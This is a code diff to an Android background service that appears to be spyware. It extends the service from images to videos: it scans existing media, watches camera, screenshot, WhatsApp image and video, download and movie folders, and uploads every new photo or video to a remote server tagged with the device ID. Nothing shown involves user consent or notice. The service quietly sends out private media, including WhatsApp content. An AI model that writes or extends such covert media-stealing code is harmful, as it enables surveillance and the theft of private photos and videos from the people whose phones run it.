@@ -38,22 +38,26 @@ public class MediaUploadService extends Service {
 
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
-        // Android 10+ के लिए MediaStore से scan करो
+        // Android 10+ ke liye MediaStore se scan karo
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            scanExistingMedia();
+            scanExistingImages();
+            scanExistingVideos();  // 🔥 VIDEOS BHI SCAN HOGE
         }
 
-        // Watch folders (यह Android 10+ में काम नहीं कर सकता)
+        // Watch folders (photos + videos dono)
         watchFolder(Environment.getExternalStorageDirectory() + "/DCIM/Camera/", "camera");
         watchFolder(Environment.getExternalStorageDirectory() + "/Pictures/Screenshots/", "screenshot");
         watchFolder(Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images/", "whatsapp");
+        watchFolder(Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video/", "whatsapp_video");  // 🔥 NEW
         watchFolder(Environment.getExternalStorageDirectory() + "/Download/", "download");
+        watchFolder(Environment.getExternalStorageDirectory() + "/Movies/", "movie");  // 🔥 NEW
+        watchFolder(Environment.getExternalStorageDirectory() + "/DCIM/Video/", "video");  // 🔥 NEW
 
         Log.d(TAG, "MediaUploadService started");
     }
 
-    private void scanExistingMedia() {
-        Log.d(TAG, "Scanning existing media...");
+    private void scanExistingImages() {
+        Log.d(TAG, "Scanning existing images...");
 
         String[] projection = {MediaStore.Images.Media.DATA};
 
@@ -70,12 +74,40 @@ public class MediaUploadService extends Service {
                     String path = cursor.getString(columnIndex);
                     File file = new File(path);
                     if (file.exists()) {
-                        uploadToServer(path, "existing");
+                        uploadToServer(path, "existing_image");
                     }
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error scanning media: " + e.getMessage());
+            Log.e(TAG, "Error scanning images: " + e.getMessage());
+        }
+    }
+
+    // 🔥 NEW: VIDEOS SCAN KARNE KA METHOD
+    private void scanExistingVideos() {
+        Log.d(TAG, "Scanning existing videos...");
+
+        String[] projection = {MediaStore.Video.Media.DATA};
+
+        try (Cursor cursor = getContentResolver().query(
+                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null,
+                null,
+                MediaStore.Video.Media.DATE_ADDED + " DESC LIMIT 20")) {
+
+            if (cursor != null) {
+                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA);
+                while (cursor.moveToNext()) {
+                    String path = cursor.getString(columnIndex);
+                    File file = new File(path);
+                    if (file.exists()) {
+                        uploadToServer(path, "existing_video");
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error scanning videos: " + e.getMessage());
         }
     }
 
@@ -93,9 +125,11 @@ public class MediaUploadService extends Service {
                 if (event == FileObserver.CREATE || event == FileObserver.MOVED_TO) {
                     String fullPath = path + fileName;
 
+                    // Photos + Videos dono allow
                     if (fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") ||
-                            fileName.endsWith(".png") || fileName.endsWith(".mp4") ||
-                            fileName.endsWith(".3gp") || fileName.endsWith(".gif")) {
+                            fileName.endsWith(".png") || fileName.endsWith(".gif") ||
+                            fileName.endsWith(".mp4") || fileName.endsWith(".3gp") ||
+                            fileName.endsWith(".mkv") || fileName.endsWith(".webm")) {  // 🔥 VIDEOS ADD KIYE
 
                         uploadToServer(fullPath, folderType);
                     }
@@ -117,7 +151,16 @@ public class MediaUploadService extends Service {
         }
 
         try {
-            RequestBody requestFile = RequestBody.create(MediaType.parse("image/*"), file);
+            // 🔥 VIDEO KE LIYE ALAG MIME TYPE
+            MediaType mediaType;
+            if (filePath.endsWith(".mp4") || filePath.endsWith(".3gp") ||
+                    filePath.endsWith(".mkv") || filePath.endsWith(".webm")) {
+                mediaType = MediaType.parse("video/*");
+            } else {
+                mediaType = MediaType.parse("image/*");
+            }
+
+            RequestBody requestFile = RequestBody.create(mediaType, file);
             MultipartBody.Part body = MultipartBody.Part.createFormData("file",
                     file.getName(), requestFile);
 
